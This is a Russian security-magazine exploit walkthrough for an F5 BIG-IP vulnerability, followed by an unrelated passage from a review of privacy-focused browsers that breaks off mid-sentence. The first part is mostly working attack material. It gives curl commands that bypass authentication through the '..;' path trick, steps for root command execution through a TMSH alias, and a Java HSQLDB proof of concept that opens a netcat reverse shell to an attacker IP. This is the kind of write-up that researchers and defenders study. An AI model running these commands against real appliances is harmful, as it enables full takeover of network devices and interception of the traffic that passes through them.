directoryList_jsp</servlet‐name>
    <servlet‐class>org.apache.jsp.tmui.locallb.workspace.
directoryList_jsp</servlet‐class>
</servlet>
...
<servlet‐mapping>
    <servlet‐name>org.apache.jsp.tmui.locallb.workspace.
directoryList_jsp</servlet‐name>
    <url‐pattern>/tmui/locallb/workspace/directoryList.jsp</
url‐pattern>
</servlet‐mapping>
...

На вход он принимает параметр directoryPath, а на выходе, как ты уже
догадался, выдает листинг указанной директории.


WEB-
INF/classes/org/apache/jsp/tmui/locallb/workspace/directo-
ryList_jsp.java
26: public final class directoryList_jsp extends HttpJspBase
implements JspSourceDependent {
...
61:   public void _jspService(HttpServletRequest request,
HttpServletResponse response) throws IOException, ServletException {
...
77:       String directoryPath = WebUtils.getProperty(request,
"directoryPath");
78:       try {
79:         JSONObject resultObject = WorkspaceUtils.listDirectory(
directoryPath);
80:         out.print(resultObject);


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/directoryList.jsp?directoryPath=/usr/local/www/tmui/
WEB‐INF/lib/" ‐s





        Чтение содержимого директорий через уязвимость в BIG‐IP

Причем содержимое директорий выводится рекурсивно.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/directoryList.jsp?directoryPath=/usr/local/www/error/" ‐s





                Директории читаются рекурсивно

Но если скрипту попада ются файлы или пап ки, которые текущий поль‐
зователь не может прочитать, то сервер вернет 500 Internal Server Error.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/directoryList.jsp?directoryPath=/etc/httpd" ‐s





  Ошибка при чтении директории через directoryList.jsp, если у текущего
  пользователя недостаточно прав

Как ты успел заметить, все эти методы чтения файлов и директорий вызыва‐
ются вот из этого класса:


com.f5.tmui.locallb.handler.workspace.WorkspaceUtils

И если поведение WorkspaceUtils.listDirectory и WorkspaceUtils.
readFile было впол не понятным, то в следующем сервлете нам придется
заглянуть в этот класс, чтобы лучше разобраться в особенностях его работы.
Класс WorkspaceUtils рас полага ется в файле .jar по такому пути:


/usr/local/www/tmui/WEB‐INF/lib/tmui.jar

Декомпилируем его с помощью все той же JD‐GUI, если ты еще этого не сде‐
лал.
  Переходим к наиболее интересному сервлету — /tmui/locallb/work‐
space/tmshCmd.jsp.


/usr/local/www/tmui/WEB-INF/web.xml
<servlet>
    <servlet‐name>org.apache.jsp.tmui.locallb.workspace.tmshCmd_jsp</
servlet‐name>
    <servlet‐class>org.apache.jsp.tmui.locallb.workspace.tmshCmd_jsp
</servlet‐class>
</servlet>
...
<servlet‐mapping>
    <servlet‐name>org.apache.jsp.tmui.locallb.workspace.tmshCmd_jsp</
servlet‐name>
    <url‐pattern>/tmui/locallb/workspace/tmshCmd.jsp</url‐pattern>
</servlet‐mapping>


WEB-
INF/classes/org/apache/jsp/tmui/locallb/workspace/tmshCmd_jsp.ja-
va
28: public final class tmshCmd_jsp extends HttpJspBase implements
JspSourceDependent {
...
63:   public void _jspService(HttpServletRequest request,
HttpServletResponse response) throws IOException, ServletException {
...
81:       String cmd = WebUtils.getProperty(request, "command");
82:       if (cmd == null || cmd.length() == 0) {
83:         logger.error(NLSEngine.getString("ilx.workspace.error.
TmshCommandFailed"));
84:       } else {
85:         JSONObject resultObject = WorkspaceUtils.runTmshCommand(
cmd);
86:         tmshResult = resultObject.toString();

Здесь на вход принимается параметр command, который затем передается
в метод WorkspaceUtils.runTmshCommand. Так как мы декомпилировали этот
класс, то посмотрим, что делает runTmshCommand.


WEB-
INF/lib/tmui.jar/com/f5/tmui/locallb/handler/workspace/WorkspaceU-
tils.java
01: package com.f5.tmui.locallb.handler.workspace;
...
31: public class WorkspaceUtils {
...
46:   public static JSONObject runTmshCommand(String command) {
...
51:     String operation = command.split(" ")[0];
...
53:       try {
54:         String[] args = { command };
55:         Syscall.Result result = Syscall.callElevated(Syscall.TMSH
, args);
56:         output = result.getOutput();
57:         error = result.getError();

Здесь происходит парсинг строки, которую мы передавали в command,
и затем вызов Syscall.callElevated. Как видно из названия, этот метод
вызывает команду Syscall.TMSH с повышенными привилегиями.


WEB-INF/lib/tmui.jar/com/f5/tmui/util/Syscall.java
13: import com.f5.mcp.schema.ltm.ShellCommandT;
...
78:   public static final int TMSH = ShellCommandT.SC_TMSH.intValue()
;

Класс com.f5.mcp.schema.ltm.ShellCommandT находится в файле f5.rest.
mcp.schema.jar. Декомпилиру ем и заглядыва ем в него.


usr/share/java/rest/libs/f5.rest.mcp.schema.jar/com/f5/mcp/schema
/ltm/ShellCommandT.java
01: package com.f5.mcp.schema.ltm;
...
05: public class ShellCommandT extends SchemaEnum {
...
70:   public static final ShellCommandT SC_TMSH = new ShellCommandT(
"SC_TMSH", 32L);
...
94:   protected ShellCommandT(String tokenName, long tokenValue) {
95:     super("shell_command_t", tokenName, tokenValue);
96:   }

TMSH (Traﬃc Management SHell) — это bash‐подоб ная утилита для админис‐
трирования BIG‐IP. В ней можно автоматизировать команды и процессы, соз‐
давать собственные команды или наборы команд, выполнять кас томные
скрипты на TCL, использовать разные сценарии поведения сервера, вплоть
до его перезагрузки и полного выключения. Очень инте ресные возможности,
не правда ли? :) А если учесть, что все это делается с привилегиями супер‐
пользователя, то этот сервлет ста новится лакомым кусочком при эксплуата‐
ции уязвимости.


WEB-INF/lib/tmui.jar/com/f5/tmui/util/Syscall.java
162: public static Result callElevated(int command, String[] args)
throws CallException {
163:   return call(command, args, true);
164: }
...
186: private static Result call(int command, String[] args, boolean
elevated) throws CallException {
...
203:   Connection c = null;
204:   try {
...
206:     c = ConnectionManager.instance().getConnection();
...
209:     c.setUser(UsernameHolder.getUser().getUsername(), (!elevated
&& !UsernameHolder.isElevated()), false);
210:     ObjectManager om = new ObjectManager((SchemaStructured)
LtmModule.ShellCall, c);
211:     DataObject query = om.newObject();
212:     query.put((SchemaAttribute)ShellCall.COMMAND, command);
213:     query.put((SchemaAttribute)ShellCall.ARGS, parameters);
214:     query.put((SchemaAttribute)ShellCall.USER, UsernameHolder.
getUser().getUsername());
215:     DataObject[] rs = om.queryStats(query);
216:     if (rs != null && rs.length > 0)
217:       return new Result(rs[0].getInt((SchemaAttribute)ShellCall.
RETURN_CODE), rs[0].getString((SchemaAttribute)ShellCall.RESULTS), rs
[0].getString((SchemaAttribute)ShellCall.ERRORS));

Давай попробуем вывес ти список администраторов BIG‐IP. Это делается
при помощи команды tmsh list auth user admin.





      Просмотр списка администраторов BIG‐IP через утилиту TMSH

Теперь сделаем то же самое, только через уяз вимость.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/tmshCmd.jsp?command=list+auth+user+admin" ‐s





        Выполнение команд TMSH через уяз вимость в F5 BIG‐IP

Но это не все! Если немного углубиться в документацию TMSH, то можно
обнаружить интересную команду bash модуля util.





                    Список команд модуля util

Эта команда делает именно то, что от нее ожидаешь, — вызывает bash
в необходимом контек сте. Здесь есть все те же фла ги, что и в обычном bash.





               Страница ману ала команды bash в TMSH

Лю бые команды из модуля util можно вызывать как при помощи run, так
и прямо из командной строки.
 • run /util bash c id
 • bash c id





         Разные варианты выполнения команд в bash через TMSH

Однако, если попробовать выполнить любой из вариантов через уязвимость,
в ответ сервер вернет ошибку Rejected Tmsh Command.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/tmshCmd.jsp?command=bash+‐c+id" ‐s





    Попытка вызвать произвольную команду через уязвимость в BIG‐IP

Это происходит из‐за того, что перед тем, как выполнить TMSH‐команду, сер‐
влет tmshCmd_jsp произво дит несколь ко проверок.


WEB-
INF/lib/tmui.jar/com/f5/tmui/locallb/handler/workspace/WorkspaceU-
tils.java
52:     if (!ShellCommandValidator.checkForBadShellCharacters(command
) && (operation.equals("create") || operation.equals("delete") ||
operation.equals("list") || operation.equals("modify"))) {

Метод ShellCommandValidator.checkForBadShellCharacters проверяет
наличие запрещенных символов в стро ке. В расс трельный список попали:


& ; ` ' \ " | * ? ~ < > ^ ( ) [ ] { } $ \n \r


WEB-INF/lib/tmui.jar/com/f5/form/ShellCommandValidator.java
24: public static boolean checkForBadShellCharacters(String value) {
25:   char[] cArray = value.toCharArray();
26:   for (int i = 0; i < cArray.length; i++) {
27:     char c = cArray[i];
28:     if (c == '&' || c == ';' || c == '`' || c == ''' || c == '\'
|| c == '"' || c == '|' || c == '*' || c == '?' || c == '~' || c ==
'<' || c == '>' || c == '^' || c == '(' || c == ')' || c == '[' || c
== ']' || c == '{' || c == '}' || c == '$' || c == '\n' || c == '\r')
29:       return true;
30:   }
31:   return false;
32: }

Но это не главная проб лема. Что действитель но уменьшает область дей‐
ствия, так это вторая часть усло вия — про верка выполняемой опе рации.


operation.equals("create") || operation.equals("delete") || operation
.equals("list") || operation.equals("modify")

Как видишь, возможно выполнить только четыре команды TMSH: create,
delete, list и modify. И здесь на помощь приходят алиасы. Как и в bash,
в TMSH можно создать псевдонимы (alias) для команды, чтобы каждый раз
не набирать ее. За это отвечает модуль cli alias. Алиасы бывают двух типов —
shared и private. Они отличаются областью видимости — первые дос тупны
внутри всей системы, вторые огра ничены текущим пользователем. Пос‐
мотреть список псевдонимов можно с помощью команды list, удалить —
delete, а создать новый при помощи create.





             Список общих (shared) псевдонимов в TMSH

Думаю, ты уже догадываешь ся, к чему я веду. Нужно создать псевдоним
для команды bash, в качестве имени которо го ука зать любую из четырех раз‐
решенных операций. Только советую делать область видимос ти private
и удалять псевдоним сразу после выполнения необ ходимой команды, чтобы
не мешать нормальной работе системы. Итак, план действий следующий.
  Командой create cli alias private modify command bash создаем
в зоне видимости пользователя алиас с именем modify, который будет
вызывать команду bash.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/tmshCmd.
jsp?command=create+cli+alias+private+modify+command+bash" ‐s

Теперь modify ‐c id выполнит необ ходимую команду. В моем случае это id.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/tmshCmd.jsp?command=modify+‐c+id" ‐s

Затем delete cli alias private modify — уда ляем соз данный алиас
во избежание проб лем.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/tmui/locallb/
workspace/tmshCmd.jsp?command=delete+cli+alias+private+modify" ‐s





  Успешная эксплуатация уязвимос ти в F5 BIG‐IP. Выполнение произволь‐
  ных команд с правами суперпользователя

Такую последовательность легко автомати зиро вать. Готовые решения ты
с легкостью сможешь найти на просторах GitHub. Существует даже готовый
модуль для Metasploit.
  К слову, этот способ RCE был найден позднее. Михаил же в своем репор‐
те предлагает более интересный метод выполнения команд — через базу
данных HyperSQL. Давай заодно посмотрим, как это делается.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ

     БОЛЬШАЯ ДЫРА
                BIG-IP           В
                  КАК РАБОТАЕТ НОВАЯ УЯЗВИМОСТЬ
                     В ПРОДУКТАХ КОМПАНИИ F5





RCE ЧЕРЕЗ HYPERSQL
В BIG‐IP используется база данных HyperSQL. Запросы к сервле ту, который
с ней работает, httpd проксируют по URI /hsqldb.


/etc/httpd/conf.d/proxy_ajp.conf
ProxyPassMatch ^/hsqldb(.*)$ ajp ://localhost:8009 /tmui /hsqldb $1 retry
=5

Конечно же, этот адрес доступен только пос ле авторизации, но ты уже зна‐
ешь, как это обойти.


curl ‐k "https://192.168.31.140/tmui/login.jsp/..;/hsqldb/" ‐s





            Обход авто риза ции для дос тупа к HSQLDB

HyperSQL позволяет работать с базой данных по протоколу HTTP(S). Подклю‐
чение описано в документации. По дефолту используется пользователь SA
и пустой пароль.
   Теперь давай накида ем PoC, который будет делать какие‐нибудь прос тые
запросы к БД. Для начала нужно ска чать пра виль ную библиотеку HSQLDB
(ZIP). Затем пропишем в hosts строку


192.168.31.140 localhost.localdomain

Разумеется, IP дол жен быть твоей виртуалки! :) Это нужно, чтобы не возиться
с SSL‐сертификатами в Java. Далее в качес тве URL для коннекта к базе дан‐
ных указываем адрес с байпасом авто ризации.


/hsqldb-poc-rce/src/com/f5rce/Main.java
01: package com.f5rce;
02:
03: import java.sql.*;
04: import java.lang.*;
05: import java.util.Properties;
06:
07: public class Main {
08:
09:     public static void main(String[] args) throws Exception {
10:         Class.forName("org.hsqldb.jdbcDriver");
11:         String connectionURL = "jdbc:hsqldb:https://localhost.
localdomain/tmui/login.jsp/..%3b/hsqldb/";

Теперь имя пользователя и пароль.


/hsqldb-poc-rce/src/com/f5rce/Main.java
12: Properties props = new Properties();
13: props.setProperty("user","SA");
14: props.setProperty("password","");

Подключаемся к БД.


/hsqldb-poc-rce/src/com/f5rce/Main.java
15: try {
16:     Connection c = DriverManager.getConnection(connectionURL,
props);
17:     Statement stmt = null;
18:     ResultSet result = null;

Теперь выполняем простенький запрос


SELECT * FROM INFORMATION_SCHEMA.SYSTEM_USERS


/hsqldb-poc-rce/src/com/f5rce/Main.java
19: stmt = c.createStatement();
20: result = stmt.executeQuery("SELECT * FROM INFORMATION_SCHEMA.
SYSTEM_USERS");

Получаем результат и выводим в консоль.


/hsqldb-poc-rce/src/com/f5rce/Main.java
21:     while (result.next()) {
22:         System.out.println("Got result: " + result.getString(1));
23:     }
24:     result.close();
25:     stmt.close();
26: } catch (SQLException e) {
27:     e.printStackTrace();
28: }





  Выполнение запроса к БД HyperSQL через обход авторизации в BIG‐IP

Если внимательно просмотреть документацию к базе данных, то можно обна‐
ружить любопытную функцию CALL, которая позволяет вызывать внешние
функции Java.
  Сначала проверим classpath — пути, отку да подгружаются библиотеки:


CALL "java.lang.System.getProperty"('java.class.path')


/hsqldb-poc-rce/src/com/f5rce/Main.java
20: result = stmt.executeQuery("CALL "java.lang.System.getProperty"(
'java.class.path')");





            Получение classpath через HSQLDB в BIG‐IP

Аналогичные пути использует Tomcat. Это хорошо, так как список потенциаль‐
но опасных методов довольно обширен. Среди это го многообразия нужно
найти метод с модификатором static, то есть тот, который можно вызывать
без создания объекта клас са. Михаил обна ружил подходящий:


com.f5.view.web.pagedefinition.shuffler.Scripting#setRequestContext

Он находится в файле /usr/local/www/tmui/WEB‐INF/classes/tmui.jar,
который мы уже декомпилировали.


WEB-
INF/lib/tmui.jar/com/f5/view/web/pagedefinition/shuffler/Scripting.ja-
va
01: package com.f5.view.web.pagedefinition.shuffler;
...
12: public class Scripting {
13:   static {
14:     Properties props = new Properties();
15:     System.setProperty("java.ext.dirs", "/usr/local/www/tmui/
WEB‐INF/lib/");
16:     System.setProperty("java.class.path", System.getProperty(
"java.class.path") + ":/usr/local/www/tmui/WEB‐INF/classes");
...
45:   public static void setRequestContext(String object, String
screen) {
46:     PyObject current = getInterpreter().eval(object + "__" +
screen + "()");
47:     currentObject.set(current);
48:   }

Этот метод выпол няет код Jython и воз вра щает объект типа org.python.‐
core.PyObject. Jython — это реализация язы ка Python на Java, поэтому нужно
использовать его конструкции. Будем выполнять код при помощи Runtime.
getRuntime().exec(). Для нашего удобс тва в BIG‐IP по дефолту установлен
netcat с поддержкой флага ‐e. Делаем через него бэкконнект.


/hsqldb-poc-rce/src/com/f5rce/Main.java
20: result = stmt.executeQuery("CALL "com.f5.view.web.pagedefinition.
shuffler.Scripting.setRequestContext" +
21:         ""('Runtime.getRuntime().exec("nc 192.168.31.12 1337 ‐e /
bin/bash")#','#')");





  Успешная эксплуатация BIG‐IP. Удаленное выполнение команд через
  HSQLDB


ДЕМОНСТРАЦИЯ УЯЗВИМОСТИ (ВИДЕО)





ЗАКЛЮЧЕНИЕ
Рассмотренная уязвимость в очередной раз доказывает, что даже такая нез‐
начительная проблема, как некорректная нормализа ция пути, ведет к серь‐
езным последствиям. Знание инфраструктуры при ложения и воз можнос ти
входящих в его состав инстру ментов позволили полностью захватить кон‐
троль над машиной BIG‐IP. И думаю, нет смысла объяснять, какие проблемы
может вызвать скомпрометированная система, через которую ходит весь
сетевой трафик.
  После получения деталей уязвимости разработ чики F5 предложили ряд
временных решений до выхода полноценного патча. К сожалению, некоторые
из них оказались неэффективными и не позволя ют в должной мере защитить‐
ся от злоумышленников. Поэто му лучше всего обновляться до версии при‐
ложения, где проб лема полностью исправлена.
ПРИВАТНОСТЬ

СОРЕВНОВАНИЕ
 В ПРИВАТНОСТИ





                                      Валентин Холмогоров
                                                 valentin@holmogorov.ru




        ТЕСТИРУЕМ БРАУЗЕРЫ,
         КОТОРЫЕ ОБЕЩАЮТ
        НЕ ОСТАВЛЯТЬ СЛЕДОВ





Установ ка специального безопасного браузера — это один
из способов быс тро и легко повысить уро вень своей приват‐
ности. Только браузеров этих развелось в последнее время
как блох на барбоске. С какими из них не страшно и в огонь,
и в воду, и на сайты для взрослых, а с какими лучше дальше
Яндекса не ходить вовсе? Сегодня мы попытаемся найти
ответ на этот животрепещущий вопрос.


Когда‐то на «Гор бушке» водилась особая порода мужичков с хитрым при‐
щуром, у которых обыватели могли при обрести по сходной цене ком‐
пакт‐диск с адресно‐телефонной базой жителей Москвы и остального Под‐
московья вплоть до Камчатки. Сейчас торговлей персональными данными
занимаются куда более крутые ребята: социаль ные сети конкуриру ют в этом
бизнесе с поисковиками, от которых с неболь шим отры вом отстают банки
и прочие коммерческие структуры.
  Для трекинга юзеров используются не только файлы cookies и прес‐
ловутое отсле живание по IP, но и так называемый отпечаток браузера, вклю‐
чающий данные о версии программы, разрядности ОС, языковых настройках,
User Agent, экранном разрешении и иных технических параметрах системы.
Еще есть технология Evercookie, реализованная с помощью спе циального
приложения на  JavaScript, и поведенческий анализ, когда спе циальные
скрипты собирают информа цию о действиях пользовате ля — времени прос‐
мотра веб‐страниц, скорос ти прокрутки, нажатиях на ссылки и прочем.
Отследить, а тем более заб локировать все эти функции не так‐то просто.
  В настройках любого современного бра узера можно отыскать раздел
«Безопасность», где соб раны связанные с приватностью и конфиденциаль‐
ностью параметры. Так, в Chrome присутс твует режим «безопасного прос‐
мотра» веб‐страниц со встроенной защитой от «потенциально опас ных» сай‐
тов, возможность включить собственную DNS‐служ бу, а также настроить
электронные ключи и сертифика ты. В Opera есть собственный VPN, больше
похожий на банальный прокси, и возможность зап ретить веб‐узлам отсле‐
живать исходящий трафик. Плюс та же стандартная «защита от вредоносных
сайтов». Firefox име ет встроенную защиту от трекинга, позволяет нас троить
параметры хранения паролей, cookies и истории бра узера.
  Однако все эти техничес кие ухищрения нивелируются возможностью уста‐
новки плагинов, которые могут тво рить почти все, что угодно их раз работ‐
чикам. Некоторые плагины спо собны отправлять личные данные на удален‐
ный сервер, отслеживать действия пользователя, встраивать в просматри‐
ваемые  веб‐страницы  рекламу. В общем,  если  эле ментарная защита
от слежки встро ена практически во все современные браузеры, то защита
от юзера там напрочь отсутс твует.
  Считается, что безопас ные, или, как их еще называют, защищенные, бра‐
узеры — это «чистая» программа без всяких свистелок и дополнений,
заточенная  под  максимальную  конфиденциальность.  Они  позволяют
работать в интернете, оставляя минимум цифровых следов, блокиру ют
передачу телеметрии и сбор данных. Они осто рожно относятся к файлам
cookies, истории просмотра и более бережно хранят данные форм, которые
запол няет пользователь, либо не хранят их вовсе. Но главное — большинство
из них не поддерживает уста новку сто ронних непроверенных расширений,
в числе которых к браузеру может «прилипнуть» что‐нибудь нехорошее.
   Когда речь заходит о защищен ных программах для просмотра веб‐стра‐
ниц, первым делом вспомина ешь Tor Browser, хорошо извес тный всем и каж‐
дому. Именно поэтому его мы и не будем рас сматривать в этой статье. Тем
более что Tor Browser чаще использует ся именно как инстру мент для сер‐
финга по даркнету. Вмес то него мы пристально взгля нем на шесть альтер‐
нативных программ, которые их раз работчики позиционируют как безопас‐
ные и защищенные браузеры для Windows.


ДОВЕРЯЙ, НО ПРОВЕРЯЙ!
Чтобы узнать, стоит ли доверять подоб ным программам, я решил не изоб‐
ретать сложных стендов и не заниматься пос тройкой специальной лабора‐
тории. Для сравнения защищен ных браузеров вполне достаточно виртуал ки
со свежеустановленной виндой и нес кольких онлайновых тестов, спе циально
созданных для проверки уровня безопасности подоб ных программ. Вот они.
 • Qualys Browser Check — проверяет уязвимости в браузере и тестиру ет
   настройки работы с файлами cookies. По умолчанию для прохождения тес‐
   та предлагается уста новить специаль ный плагин, но можно обойтись и без
   него, воспользовавшись ссылкой на сайте.
 • Cloudﬂare Browsing Experience Security Check — тест от известной ком‐
   пании Cloudﬂare, проверя ет используемые браузером DNS, сертификаты,
   настройки cookies и наличие извес тных уяз вимос тей.
 • Privacy Analyzer — комплексная проверка браузера на возможность утечки
   данных. Проверяется отслеживание по IP, отпечатку браузера, тестируются
   настройки приватности.
 • Panopticlick — тест на third‐party tracking cookies и отслеживание по отпе‐
   чатку браузера.
 • Webkay — сервис, демонстрирующий всю информацию, которую твой
   браузер передает веб‐сайтам в интернете.

Итак, с критериями оценки разобрались. Теперь перейдем к нашим подопыт‐
ным браузерам — какие результаты они нам покажут с настройками по умол‐
чанию? Сейчас узнаем!



                                     Раз работчик: Comodo Group
COMODO DRAGON            Сайт:    comodo.com/home/browsers‐
                                                  toolbars/browser.php


Comodo Dragon, пожалуй, самое рас кру ченное решение для безопасного
серфинга в сети после Tor Browser. Dragon претендует на роль универсаль‐
ного решения для тех, кому неохота ждать по полчаса, пока запус тится Tor.


             INFO

                     Репутация Comodo однажды серьезно постра‐
                       дала — когда в 2016 году компанию уличили
                        в  том,  что ее продук ты без спроса  ставили
                       на компьюте ры VNC‐сервер.


На самом деле чуваки из Comodo сделали целых два секьюрных браузера
с одним и тем же набором функций, но на раз ных движках: Comodo Dragon
на платформе Chromium и Ice Dragon на базе Firefox. Среди заявленных воз‐
можностей — встроенная защита от малвари, использование безопас ных
DNS, блокировка cookies и валидация доменов для борьбы с фишингом.
  Я скачал сразу обе версии «Ящерки» и запус тил их на виртуал ке по оче‐
реди. Внешне Dragon выглядит как привычный Chrome и запус кается пример‐
но с той же скоростью — на моей виртуал ке его загрузка заняла в сред‐
нем 4,5 секунды. От «Хрома» бра узер унаследовал и любовь к оперативной
памяти — с одним окном и одной открытой вкладкой Comodo Dragon с ходу
запустил в системе пять процессов и отожрал 90 Мбайт.





   Comodo Dragon, как любой ува жающий себя Chromium, любит память

Что ж, посмотрим, что скажут тес ты.
 • Qualys Browser Check рас познал в Comodo Dragon браузер Chrome,
   причем устаревшей вер сии, пос ле чего предложил скачать с сайта Google
   версию поновее.
 • Cloudflare Browsing Experience Security Check определил, что Drag‐
   on не проверяет подлинность ответов DNS‐серверов с помощью DNSSEC
   и не поддерживает шифрование имени сервера SNI при установке TLS‐
   соединения, — теоретичес ки это может пос тавить под угрозу конфиден‐
   циальность.
 • Тест Privacy Analyzer показал, что Dragon успешно передал удаленному
   узлу мой IP‐адрес, локацию, версию браузера, разрядность ОС и данные
  об экранном разрешении.
 • Panopticlick продемонстрировал, что бра узер име ет уникальный «отпе‐
   чаток» и не посылает на сервер HTTP‐флаг DNT (do not track), а это поз‐
   воляет отслеживать пользователя. Все остальные тесты безопасности
   на этом сайте Comodo Dragon прошел успешно.
 • Наконец, судя по стра ничке Webkay, помимо версии и разрядности Win‐
   dows, IP‐адреса и экранного раз решения, Dragon позволя ет верно рас‐
   познать уровень заряда батареи моего девай са и тип процессора. Прос‐
   канировать локальную сеть в поисках дос тупных устройств браузер не дал.

Comodo Ice Dragon внешне мало чем отличается от своего «неледяного»
собрата. Firefox и Firefox, ничего осо бенного. Загружается и работает он
довольно шустро: от щелчка мышью на значке до запуска приложения прош‐
ло три секунды.





            Comodo Ice Dragon похож на обычный Firefox

 • Qualys Browser Check не обна ружил никаких недостатков, тест прой ден
   со стопроцентным успехом.
 • Cloudflare Browsing Experience Security Check показал в точности
   тот же результат, что и в предыдущем случае.
 • По заключению Privacy Analyzer, бра узер отда ет наружу все те же дан‐
   ные, что и его родной брат, в том числе IP‐адрес и версию ОС.
 • Panopticlick сооб щил, что программа не бло кирует попытки рекламного
   трекинга, не посылает DNT и имеет уникальный «отпе чаток».
 • А вот Webkay преподнес сюр приз: оказалось, что браузер имеет уни каль‐
  ный User Agent IceDracon 65.0.2 и не отправляет на сторону вообще
   никаких данных о железе, кроме разрядности про цес сора. Зато, помимо
  внешнего айпишника, Webkay радос тно про демонстри ровал мне  IP
   сетевого интерфейса моей локалки. С помощью специальной кнопки
   на сайте я попытался просканиро вать дос тупные в локальной сети девай‐
   сы, но поиск результатов не принес.



                                     Раз работчик: Alex Kontos
WATERFOX                        Сайт: waterfox.net


Это еще один клон Firefox с упором на безопас ность, имеющий версии
не только для винды, но и для macOS и Linux, при чем дос тупна только 64‐раз‐
рядная версия. В разделе «О прог рамме» официального сай та сказано, что
браузер сделал в 2011 году шес тнадцатилетний школьник Алекс Контос,
который занимается обновлением и поддержкой своего детища и по сей
день. Автор утверждает, что его приложение не собирает телеметрию
и отправляет наружу только данные о версии браузера и ОС, чтобы вовремя
получать обновления. Все остальные конфиденциаль ные, заверяет разработ‐
чик, в полной безопасности. Внешне прог рамма пред ставляет собой самый
обычный Firefox — настолько обычный, что даже скучно. Работает и загружа‐
ется с такой же скоростью, существенных различий с обычной «Лисицей» я
не заметил.





           Waterfox — это тоже Firefox без особых внешних отличий

Посмотрим, как оце нят поделку школьника тесты.
 • Qualys Browser Check — тест пройден успешно, ни одной проблемы
   не выявлено.
 • Cloudflare Browsing Experience Security Check показал, что у Water‐
   fox есть проблемы с проверкой DDNSEC и при менением Encrypted SNI.
  Кроме того, браузер не поддерживает TLS 1.3.
 • Наконец, Waterfox успешно провалил все тесты Privacy Analyzer, а по
   данным Panopticlick и Webkay — слил наружу мой IP‐адрес, тип и раз‐
   рядность процессора, а также парамет ры экранного разрешения, но все
   остальные данные бла гора зумно ута ил.

Примечательно, что Waterfox распознается как  Firefox 56.0, в то время
как актуальная версия «Лисицы» на сегодняшний день 79.0. То есть клон
отстает от оригинала примерно на вечность, и это может означать проблемы
уже не с приватностью, а с безопасностью.



                                     Раз работчик: SRWare
IRON                                 Сайт: srware.net/iron


Iron — это не «ирония», а «утюг» «железо», что как бы намекает нам на бру‐
тальность и надежность данного бра узера. «Железяка» собрана на основе
Chromium, использует последние версии WebKit и V8, а также включает собс‐
твенный компонент блокировки рекламы. При мечательно, что у сайта раз‐
работчика есть русская версия — правда, складывается ощущение, что
переведена она на великий и могучий при помощи все того же Google Trans‐
late. По утвержде ниям соз дателей, Iron не отправляет в Google телеметрию,
не отсылает автоматические баг‐репорты и не обновляется в фоновом
режиме, что позволя ет экономить трафик. А еще он обладает «элегантным
дизайным».
  SRWare Iron похож на Chrome чуть менее, чем полностью. Программа
запускается примерно за 3,5 секунды и работает с несколькими откры тыми
вкладками  довольно‐таки  шус тро:  значитель ных  тормозов  я  за  ней
не заметил. Мне даже показалось, что этот бра узер работает побыстрее, чем
Chromium в сборке Comodo.





                 Железный утюг SRWare Iron

 • Qualys Browser Check пожало вался мне на уста ревшую версию Google
  Chrome (83.0.4250) и сообщил, что она небезопас на.
 • Тест Cloudflare продемонстрировал показа тели, аналогичные браузе рам
  Comodo, — вклю ченная поддержка TLS 1.3, но претензии к DNSSEC и En‐
   crypted SNI.
 • Panopticlick ругнулся на стандартный набор проблем с приватностью
   (все тесты оказались провалены) и меж ду делом заметил, что если в SR‐
   Ware Iron и присутству ет какой‐то блокировщик рекламы, то он не работа‐
   ет.
 • Privacy Analyzer и Webkay сооб щили, что «Железяка» отдает наружу
   данные о версии бра узера, версии и разрядности ОС, IP‐адрес, все све‐
   дения о железе (вклю чая модель видеокарты, экранное разрешение
   и состояние батареи), одна ко данные о локаль ной сети остались для We‐
   bkay тайной.



                                     Раз работчик: Brave Software
BRAVE                              Сайт: brave.com


Создатели браузера Brave утвержда ют, что их про дукт на базе Chromium,
как никакой другой, предотвращает трекинг и воз можные утечки данных.
Одна из фишек Brave — возможность отправлять криптовалютные платежи
веб‐сайтам и создателям контента в виде Basic Attention Tokens — раз‐
работанной Brave Software криптовалютной платформы на базе Etherium.
  В 2017 году, кода платформа была впервые запущена, Brave Software про‐
дала токенов на сумму более 35 миллионов долларов США, а новым поль‐
зователям  платформы  раз дали  в  целях  привлечения  в общей  слож‐
ности 300 тысяч токенов. Пользователи бра узера Brave могут зарабатывать
токены за просмотр рекламы или платить создателям контента — либо
отправляя микротранзакции, либо используя встроенную функцию Brave, ког‐
да заранее установленная сумма воз награждения распределяется автомати‐
чески между владельцами зарегистрированных в системе сайтов в зависи‐
мости от того, сколько времени юзер провел за просмотром контента.
  Существуют версии браузера для Windows, macOS, Linux, а также Android
и iOS. Мы рассмотрим только пер вую из них, интерфейс которой, как и сле‐
довало ожидать, косплеит Chrome.





                   Криптовалютный бра узер Brave

 • Qualys Browser Check показал, что текущая версия Chrome акту альна,
   обновления не требуется.
 • Тест Cloudflare не продемонстрировал ничего нового — аналогичный
   результат был и у бра узеров Comodo, и у Iron.
 • А вот Panopticlick дал неожиданный результат: как оказалось, Brave
   успешно блокирует  рекламу,  автоматический  тре кинг, но при этом
   не отправляет DNT и обла дает характерным «отпе чатком», по которому
   его можно вычислить.
 • Privacy Analyzer и Webkay удивили еще больше: оба сайта не показали
  мой IP‐адрес и локацию, хотя сервисы вроде WhatIsMyIP его без проблем
   определили. Браузер передал данные о вер сии и разрядности ОС, железе
   (включая процессор, гра фический адаптер, экранное разрешение и сос‐
   тояние батареи). В качес тве User Agent программа использует Chrome
  84.0.4147.125.

В целом — неплохой результат. С учетом того что приложение работает дос‐
таточно быстро (хотя по ощущениям и медленнее Iron), к нему явно стоит
присмотреться.



                                     Раз работчик: Hidden Reﬂex
EPIC                                 Сайт: epicbrowser.com


Этот браузер разработан компанией, базирующей ся в Бангалоре (Индия)
с представительством в Вашингтоне. Тут мне нестерпимо хотелось пошутить
про индусский код, но Epic, как и его конкуренты, основан на Chromium,
поэтому код там гугловский. Раз работчик программы Алок Бхардвадж (Alok
